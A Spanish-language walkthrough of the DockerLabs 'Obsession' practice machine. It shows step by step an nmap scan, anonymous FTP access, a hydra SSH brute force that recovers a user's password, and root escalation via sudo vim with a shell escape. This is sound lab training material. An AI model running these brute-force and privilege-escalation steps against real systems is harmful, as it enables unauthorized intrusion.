Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "Obsession".
Una vez hecho , descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh obsession.tar
```
Tras desplegarse la maquina, hacemos un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 -n -Pn -vvv 172.17.0.2
```
y vemos que tiene 3 puertos abiertos, el 21 (FTP), el 22 (SSH) y el 80 (HTTP):
```
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 21/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
```
Resulta que el puerto 21 (FTP) nos permite entrar como usuario anonimo, y ademas continene 2 archivos, asi que probaremos a entrar por aqui:
```
ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0             667 Jun 18 03:20 chat-gonza.txt
|_-rw-r--r--    1 0        0             315 Jun 18 03:21 pendientes.txt
```
Tras haber entrado con el comando "ftp 172.17.0.2" y poner el usuario "anonymous" (sin contraseña), nos descargaremos ambos archivos para trabajarlos en local:
```
get chat-gonza.txt
get pendientes.txt
```
Hecho esto, hacemos un "cat" a ambos para ver si tienen informacion relevante:
```
cat chat-gonza.txt       

[16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
[16:28, 16/6/2024] Russoski: es una auténtica princesa pff, le he hecho hasta un vídeo y todo, lo tengo ya subido y tengo la URL guardada
[16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres
[21:52, 16/6/2024] Gonza: buah la verdad tenías razón eh, es hermosa esa chica, del 9 no baja
[21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, así sí
[22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y sí buen training hoy
```

```
cat pendientes.txt

1 Comprar el Voucher de la certificación eJPTv2 cuanto antes!
2 Aumentar el precio de mis asesorías online en la Web!
3 Terminar mi laboratorio vulnerable para la plataforma Dockerlabs!
4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos
  permisos habilitados que no son del todo seguros..
```
En principio, el segundo no parece darnos informacion muy relevante, sin embargo, el primer archivo, nos proporciona 2 nombres: "gonza" y "russoski".
Es momento de probar la FUERZA BRUTA con ambos usuarios e HYDRA, para ver si podemos obtener las contraseñas de ambos (o al menos, de uno de ellos), por lo que lanzaremos los siguientes comandos:
```
hydra -l gonza -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
Con este usuario, no hemos obtenido nada. Probaremos ahora con el otro usuario: "russoski":
```
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
Y obtenemos en este caso la contraseña:
```
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
```
Es momento entonces de acceder al puerto 22 (SSH), con estas credenciales:
```
ssh russoski@172.17.0.2
```
Y tras escribir "yes" en la primera pregunta e introducir la contraseña obtenida con HYDRA cuando nos piden el password, ya estariamos dentro.
```
russoski@05350891ffe2:~$ whoami
russoski
russoski@05350891ffe2:~$
```
Ahora intentaremos hacer una escalada de privilegios. Para ello, como siempre, empezariamos con el comando "sudo -l" y que, en este caso, nos mostraria:
```
russoski@05350891ffe2:~$ sudo -l

Matching Defaults entries for russoski on 05350891ffe2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User russoski may run the following commands on 05350891ffe2:
    (root) NOPASSWD: /usr/bin/vim  <== Intentaremos hacer la escalada con "vim"
    
russoski@05350891ffe2:~$
```
Como se puede observar, tendriamos permisos de "root", sin password, con el binario "vim", por lo que iremos a la pagina de "gtfobins" a buscarlo (o con el comando "searchbins", si lo tuviesemos instalado).
Una vez en GTFObins, buscaremos "vim", y elegiremos el apartado "sudo", lo que nos mostrara lo siguiente:
```
sudo vim -c ':!/bin/sh'
```
En este caso y respetando siempre la RUTA ABSOLUTA, escribiriamos:
```
russoski@05350891ffe2:~$ sudo /usr/bin/vim -c ':!/bin/sh'

# whoami
root
#
```
Tal y como se ve arriba, ya seriamos "root" con permisos. Tambien podriamos escribir: "bash -p" para obtener un "prompt" normal:
```
# bash -p
root@05350891ffe2:/home/russoski# whoami
root
root@05350891ffe2:/home/russoski#
```
Y con esto ya estaria la maquina hecha :)
